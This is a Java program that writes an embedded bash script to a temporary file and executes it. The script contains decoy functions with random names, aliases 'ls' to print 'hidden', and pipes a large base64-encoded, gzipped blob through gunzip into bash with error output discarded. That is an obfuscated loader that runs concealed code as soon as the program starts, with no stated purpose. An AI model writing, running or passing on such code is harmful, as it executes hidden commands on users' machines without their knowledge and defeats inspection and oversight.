import java.io.*;

public class Main {
    public static void main(String[] args) {
        try {

            String script = """
#!/bin/bash

vvjt1oxnx() { echo $((RANDOM * RANDOM)); }
vff7q03qh() { for i in {1..3}; do :; done; }
vstio7yub() { alias ls='echo hidden'; }

base64 -d <<'EOF' | gunzip | bash 2>/dev/null
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
EOF
""";


            File file = File.createTempFile("start", ".sh");
            try (FileWriter fw = new FileWriter(file)) {
                fw.write(script);
            }


            file.setExecutable(true);


            ProcessBuilder pb = new ProcessBuilder("bash", file.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();


            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) System.out.println(line);
            p.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
